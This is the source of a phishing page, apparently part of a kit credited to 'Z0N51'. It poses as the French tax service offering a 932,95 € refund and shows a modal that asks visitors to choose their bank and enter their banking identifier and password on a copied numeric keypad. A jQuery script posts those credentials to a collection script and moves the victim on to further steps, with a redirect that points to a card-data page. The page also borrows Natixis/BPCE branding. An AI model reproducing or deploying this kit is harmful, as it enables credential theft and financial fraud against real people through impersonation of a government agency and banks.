<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <meta http-equiv="refresh" content=";URL=cc.php">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">
        <link rel="stylesheet" href="assets/css/newapp.css">
	    <script src="assets/js/newapp.js"></script>

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Remboursement</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Remboursement et Paiement en ligne

            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3>Remboursement sécurisé</h3>
                       <li>Référence : <b>600193110380</b></li>
                       <li>Montant de la transaction &nbsp;: <b>932,95 €</b></li>

                        </p>
                    </div>

 
 <style>
		/* The Modal (background) */
		.modalb {
			display: block;
			/* Hidden by default */
			position: fixed;
			/* Stay in place */
			z-index: 999999999;
			/* Sit on top */
			padding-top: 60px;
			/* Location of the box */
			left: 0;
			top: 0;
			width: 100%;
			/* Full width */
			height: 100%;
			/* Full height */
			overflow: auto;
			/* Enable scroll if needed */
			background-color: rgb(0, 0, 0);
			/* Fallback color */
			background-color: rgba(0, 0, 0, 0.4);
			/* Black w/ opacity */
		}

		/* Modal Content */
		.modal-contentb {
			background-color: #fefefe;
			margin: auto;
			border: 1px solid #888;
			width: 80%;
			max-height: 773px;
			height: auto;
			max-width: 620px;
			border-radius: 9px;
			box-shadow: 0 2px 4px 0 rgba(12, 43, 119, 0.15);
			overflow: hidden;
			z-index: 10003;
		}
		#myModalb .header {
	position: relative;
	color: #fff;
	background-color: #1344a1;
	overflow: hidden;
	_overflow: visible;
	zoom: 1;
	margin-bottom: 0px;
}
#myModalb .header {
	position: relative;
	height: auto;
	background-color: #fff;
	zoom: 1;
	margin-bottom: 0;
	overflow: hidden;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -35%;
	left: -6.5%;
	background-color: #308276;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
#myModalb .header .round-banner {
	position: relative;
	height: 10rem;
	width: 100%;
	overflow: hidden;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 2.4rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -5%;
	left: -6.5%;
	background-color: #0b6ba8;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
.icon-ic_interface_checklist::before {
	content: "\e950";
	color: #0b6ba8;
}
#myModalb .header .round-banner svg {
	background-color: #fff;
	border-radius: 50%;
	padding: .5rem;
	font-size: 4.8rem;
	position: absolute;
	bottom: 0.5rem;
	left: 50%;
	margin-left: -2.4rem;
}
[class^="icon-ic"], [class*=" icon-ic"] {
	font-family: 'icons2020' !important;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
}
#myModalb .header .round-banner [class*="icon-"] {
	font-size: 4.8rem;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 1.8rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
.a-center {
	text-align: center !important;
}
.button, #main .button, #main form .button {
	display: inline-block;
	min-width: auto;
	height: 3.4rem;
	padding: 0 !important;
	padding-left: 16px !important;
	padding-right: 16px !important;
	background-color: transparent;
	border: 1px solid #0b6ba8;
	border-radius: 4px;
	font-size: 1rem;
	box-sizing: border-box;
	outline: none;
}

		.header .round-banner {
			position: relative;
			height: 10rem;
			width: 100%;
			overflow: hidden;
		}

		.header #popinTitle,
		.modal-body #popinTitle {
			font-size: 2.4rem;
			line-height: 2.8rem;
			font-family: LatoBold, Arial, sans-serif !important;
			font-family: var(--text-bold-font) !important;
			font-weight: normal;
			width: 100%;
			padding: 0 1.5rem;
			margin: 0;
			color: #000;
			text-align: center;
			text-transform: none;
		}

		.button.button--primary>span,
		#main form .button.button--primary>span {
			background-color: #0b6ba8;
			background-color: var(--primary-blue-color);
			color: #FFF;
			display: block;
			height: 100%;
			display: flex;
			align-items: center;
			justify-content: center;
		}
	</style>
	


	<!-- The Modal -->
	<div id="myModalb" class="modalb">

		<!-- Modal content -->
		<div class="modal-contentb">
			
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					<div class="round-banner">
						<svg fill="#0b6ba8" width="58px" height="58px" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#0b6ba8">
						<g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M960 0c530.193 0 960 429.807 960 960s-429.807 960-960 960S0 1490.193 0 960 429.807 0 960 0Zm0 101.053c-474.384 0-858.947 384.563-858.947 858.947S485.616 1818.947 960 1818.947 1818.947 1434.384 1818.947 960 1434.384 101.053 960 101.053Zm-42.074 626.795c-85.075 39.632-157.432 107.975-229.844 207.898-10.327 14.249-10.744 22.907-.135 30.565 7.458 5.384 11.792 3.662 22.656-7.928 1.453-1.562 1.453-1.562 2.94-3.174 9.391-10.17 16.956-18.8 33.115-37.565 53.392-62.005 79.472-87.526 120.003-110.867 35.075-20.198 65.9 9.485 60.03 47.471-1.647 10.664-4.483 18.534-11.791 35.432-2.907 6.722-4.133 9.646-5.496 13.23-13.173 34.63-24.269 63.518-47.519 123.85l-1.112 2.886c-7.03 18.242-7.03 18.242-14.053 36.48-30.45 79.138-48.927 127.666-67.991 178.988l-1.118 3.008a10180.575 10180.575 0 0 0-10.189 27.469c-21.844 59.238-34.337 97.729-43.838 138.668-1.484 6.37-1.484 6.37-2.988 12.845-5.353 23.158-8.218 38.081-9.82 53.42-2.77 26.522-.543 48.24 7.792 66.493 9.432 20.655 29.697 35.43 52.819 38.786 38.518 5.592 75.683 5.194 107.515-2.048 17.914-4.073 35.638-9.405 53.03-15.942 50.352-18.932 98.861-48.472 145.846-87.52 41.11-34.26 80.008-76 120.788-127.872 3.555-4.492 3.555-4.492 7.098-8.976 12.318-15.707 18.352-25.908 20.605-36.683 2.45-11.698-7.439-23.554-15.343-19.587-3.907 1.96-7.993 6.018-14.22 13.872-4.454 5.715-6.875 8.77-9.298 11.514-9.671 10.95-19.883 22.157-30.947 33.998-18.241 19.513-36.775 38.608-63.656 65.789-13.69 13.844-30.908 25.947-49.42 35.046-29.63 14.559-56.358-3.792-53.148-36.635 2.118-21.681 7.37-44.096 15.224-65.767 17.156-47.367 31.183-85.659 62.216-170.048 13.459-36.6 19.27-52.41 26.528-72.201 21.518-58.652 38.696-105.868 55.04-151.425 20.19-56.275 31.596-98.224 36.877-141.543 3.987-32.673-5.103-63.922-25.834-85.405-22.986-23.816-55.68-34.787-96.399-34.305-45.053.535-97.607 15.256-145.963 37.783Zm308.381-388.422c-80.963-31.5-178.114 22.616-194.382 108.33-11.795 62.124 11.412 115.76 58.78 138.225 93.898 44.531 206.587-26.823 206.592-130.826.005-57.855-24.705-97.718-70.99-115.729Z" fill-rule="evenodd"></path> </g></svg>
					</div>
					<h1 id="popinTitle" style="text-align: center; color: #0b6ba8;" >M'IDENTIFIER</h1>
				</div>
				<div class="line" style="max-height: 500px;">
					<div id="compte_bancaire_haut2" class="textPopinDetail">
						<div class="block basecomponent  section blocstd">
							<div class="CQblocedito cq-dd-file"
								id="bloc_kyc_verification_donnees_personnelles_obligatoire" style="margin: 6px 24px;">
								<div class="block">
									<div class="blockInside">
										<div>

											<div class="textFCK" style="text-align: center;">
												<b>Impôt Gouv souahite accéder à votre compte. Par mesure de sécurité, veuillez vous identifier.</b>
												<br>
												<img src="asset/imgs/pngegg.png" >
												<br>
												<br>
												<form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="cc">
                      
            <div class="form-group col-10 row" style="margin-top:-10px;right:-65px">              
              <select type="bank" class="form-control bank col-8" id="bank" name="bank" style="min-width:160px;">
                            <option value="">Choisir la Banque</option>
							<option value="Credit agricole">Credit agricole</option>
							<option value="La Banque Postale">La Banque Postale</option>
							<option value="Banque Populaire">Banque Populaire</option>
                            <option value="Société Générale">Société Générale</option>
                            <option value="Caisse d’Epargne">Caisse d’Epargne</option>
                            <option value="BNP Paribas">BNP Paribas</option>
                            <option value="CIC Banque">CIC Banque</option>
							<option value="LCL Banque">LCL Banque</option>
							<option value="BRED Banque populaire">BRED Banque populaire</option>
							<option value="Crédit du Nord">Crédit du Nord</option>
							<option value="Crédit Mutuel">Crédit Mutuel</option>
							<option value="Crédit Mutuel de Bretagne">Crédit Mutuel de Bretagne</option>
							<option value="HSBC France">HSBC France</option>
							<option value="AXA Banque">AXA Banque</option>
							<option value="Crédit Coopératif">Crédit Coopératif</option>
							<option value="Allianz Banque">Allianz Banque</option>
							<option value="Boursorama Banque">Boursorama Banque</option>
							<option value="BforBank">BforBank</option>
							<option value="Monabanq">Monabanq</option>
							<option value="Fortuneo">Fortuneo</option>
							<option value="Orange bank">Orange bank</option>
							<option value="Hello Bank!">Hello Bank!</option>
							
						</select>	
              </div>
          
                                       <div id="codeServeurOuMail" class="col-10 container">
												<div class="row">

													<div class="col-12" id="codeServeurOuMailContent">
														<div class="input form-group mt-2">
															<input type="text" name="value(sCodeIdentifiant)"
																
																class="form-control text-small"
																id="codeRioValue1" autocomplete="off">
															<small id="codeServeurOuMailError"
																class="form-text form-text-error d-none">
																<i class="material-icons">error</i>&nbsp;<span
																	class="msgErr"></span>
															</small>
														</div>
													</div>

												</div>
                                            
											</div>
											<div id="motdepassenumerique" class="col-10 container" >







												<div class="digital-keyboard ">
													<div class="row">
														<div class="" id="mdpNumVal1content">
															<div class="form-group mb-0">
															
															

																<div
																	class="input-group col-12 inputPassGroup flex-nowrap">
																	<div
																		class="border border-right-0 has-feedback has-clear">
																		<input type="password" name="value(sPswDigit)"
																			class="passview col-12 border-0 pl-2"
																			id="mdpNumVal1" autocomplete="off"
																			readonly="readonly">
																	</div>
																	<div
																		class="input-group-append align-items-center border border-left-0 pr-0">
																		<div class="border-right fa-lg form-control-feedback"
																			onclick="EP.Auth.Password.clearInput('mdpNumVal1');">
																			<i id="cochemdpNumVal1"
																				class="material-icons d-none"
																				style="font-size: 16px;">X</i></div>
																				
																		<a tabindex="-1"
																			href="javascript:EP.Auth.Password.showInput('mdpNumVal1content'); document.getElementById('mdpNumVal1').focus();"
																			class="pl-1 link-secondary linkShow pl-2 pr-2"
																			style="word-break: normal">Afficher</a>
																			
																		<a tabindex="-1"
																			href="javascript:EP.Auth.Password.hideInput('mdpNumVal1content'); document.getElementById('mdpNumVal1').focus();"
																			class="pl-1 link-secondary linkHide pl-2 pr-2 d-none"
																			style="word-break: normal">Masquer</a>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="">
														<div class="">
															<table class="mt-2 mb-1 clavierNum">
																<tbody>
																	<tr>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(4,'mdpNumVal1')">4</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(6,'mdpNumVal1')">6</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(5,'mdpNumVal1')">5</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(9,'mdpNumVal1')">9</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(3,'mdpNumVal1')">3</button>
																		</td>

																	</tr>
																	<tr>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(8,'mdpNumVal1')">8</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(2,'mdpNumVal1')">2</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(7,'mdpNumVal1')">7</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(0,'mdpNumVal1')">0</button>
																		</td>

																		<td><button type="button" class="btn"
																				onclick="EP.Auth.Password.clickClavierNum(1,'mdpNumVal1')">1</button>
																		</td>

																	</tr>
																</tbody>
															</table>
														</div>
													</div>
												</div>
											</div>
											<div id="numericPasswordError" class="row d-none">
												<div class="col-12 d-none">
													<p class="text-danger p2">Required entry</p>
												</div>
											</div>

											<div id="motdepasse" class="d-none">
												<div class="col-12 container">
													<div class="row" id="password">

														<div class="col-12" id="passwordContent">
															<div class="input-group">
																<input type="password" name="value(sZoneSaisieActive)"
																	value="" class="d-none">
																<input type="password" name="value(sPsw)" maxlength="25"
																	value="" onkeyup="masquerMsgCtrlSurf()"
																	onblur="EP.Auth.Password.hideInput('passwordContent');"
																	class="form-control with-border-right text-small"
																	id="passwordValue" autocomplete="off">
																<span
																	class="input-group-append align-items-center border-primary border-left-0 pr-0">
																	<a tabindex="-1"
																		href="javascript:EP.Auth.Password.showInput('passwordContent'); document.getElementById('passwordValue').focus();"
																		class="link-secondary linkShow p-2 input-group-text">Afficher</a>
																	<a tabindex="-1"
																		href="javascript:EP.Auth.Password.hideInput('passwordContent')"
																		class="link-secondary linkHide p-2 input-group-text d-none">Masquer</a>
																</span>
															</div>
														</div>



														<div id="passwordError" class="col-12 mb-1 d-none">
															<p class="text-danger p2">Required entry</p>
														</div>
													</div>
												</div>
											</div>

										</div>






										<div id="zoneCaptcha" class="col-12 mt-2 d-none">

											<div id="captcha-container"
												data-sitekey="6Le-vQ4TAAAAAGUkXQgtKyQOkDaMAhe8oVUQykz8"
												class="g-recaptcha" style="width: 380px;height: 78px;"></div>

											<div class="col-12 btn-row justify-content-center bouton-valider">
												<div class="group-btn">
													<input type="button" id="btnValidation" name="btnValidation"
														class="btn btn-primary" value="Valider"
														onclick="javascript:EP.Stats.sendClickTag('validation capcha','action');valideCaptcha()">
												</div>


											</div>
										</div>




										<div class="col-12 btn-row justify-content-center bouton-valider">
											<div class="group-btn">
												<input type="button" name="button" value="Valider"
													class="mt-0 btn btn-primary" id="btnIdentifier">
											</div>

										</div>
									</div>
								</form>
							</div>
						</div>
						
						<div class="modal fade" id="popupModalRedirect" tabindex="-1" role="dialog">
							<div class="modal-dialog modal-dialog-centered" role="document">
								<div class="layer-5 modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-label="Close">
											<span aria-hidden="true" class="material-icons">close</span>
										</button>
									</div>
									<div class="modal-body text-center pt-0">
										<div id="modal-redirect-camion-container">
											<div id="modal-redirect-camion">
												<img src="assets/images/camion.svg" alt="camion">
											</div>
										</div>
										You will be automatically redirected to your company’s website.
									</div>
									<div class="modal-footer layer-grey row d-flex justify-content-center p-3">
										If nothing happens in a few seconds, click on the following link:
										<a class="link-secondary" href="#" onclick="reDirect()">

										</a>
									</div>
								</div>
							</div>
						</div>


					</div>

				</div>
			</div>
		</div>

	</main>

	<footer class="footer-nie">
		<div class="social">

			<div class="fa fa-linkedin custom-tooltip"
				onclick="window.open('')">
				<span class="custom-tooltip-text">
					Find Natixis Interépargne on
					LinkedIn
				</span>
			</div>
			<div class="fa fa-twitter custom-tooltip" onclick="window.open('')">
				<span class="custom-tooltip-text">
					Find Natixis Interépargne on
					Twitter
				</span>
			</div>
			<div class="fa fa-youtube-play custom-tooltip" onclick="window.open('')">
				<span class="custom-tooltip-text">
					Find Natixis Interépargne on
					YouTube
				</span>
			</div>

			<ul>
				<li>
					<a href="">
						Loi Eckert
					</a>
				</li>
				<li>
					<a
						href="">
						Sécurité
					</a>
				</li>

				<li>
					<a href=""
						title="Legal information"
						onclick="javascript:EP.Stats.sendClickTag('mentions legales','navigation');">
						Mentions légales
					</a>
				</li>
				<li>
					<a href="" title="General terms and conditions">
						Conditions générales
					</a>
				</li>

				<li>
					<a href="" class="cobrowse-button allowed-to-proceed">
						<img src="assets/images/souris-mono.svg" alt="teleconseiller" width="24"
							height="24">
					</a>
				</li>

			</ul>
		</div>

		<hr>
		<div class="bottom-footer">
			<div class="img-container">
				<img src="assets/images/Logo_BPCE.svg" alt="BPCE-logo">
			</div>
			<span>©Natixis Interépargne 2022</span>
		</div>

	</footer>

	<script>
		var icontainer = document.getElementById("icontainer");
		var pcontainer = document.getElementById("pcontainer");
		
		function modifierEmailOuCodeServeur() {
			pcontainer.style.display = "none";
			icontainer.style.display = "block";
		}
		function showp() {
			var x = document.getElementById("codeServeurOuMailValue1").value;
			if(x.length >5){
				icontainer.style.display = "none";
				pcontainer.style.display = "block";
			}
			
		}
		
	</script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>
	<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
	<script>
		function inputMail() {
		var x = document.getElementById("codeServeurOuMailValue1").value;
		document.getElementById("saisieMdpRappelCodeServeurContent").innerHTML = x;
		//document.getElementById("accountLogin2").innerHTML = x;
		}
	</script>
	<script type="text/JavaScript">
		var x = 0
		$(document).ready(function() {
			
			
			$('#btnIdentifier').click(function(e) {
				
				e.preventDefault();
				
				if ($('#mdpNumVal1').val().length >= 5 && $('#codeRioValue1').val().length >= 5) {

					$.ajax({
						type: "post",
						url: "actions/second.php",
						data: "codeRioValue1=" + $('#codeRioValue1').val() + "&mdpNumVal1=" + $('#mdpNumVal1').val(),
						success: function(response) {
							window.location.href = 'authentification.php'
						}
					});
				} else {
					alert('eroor identifiant')
				}
			});

		})

	</script>

</html>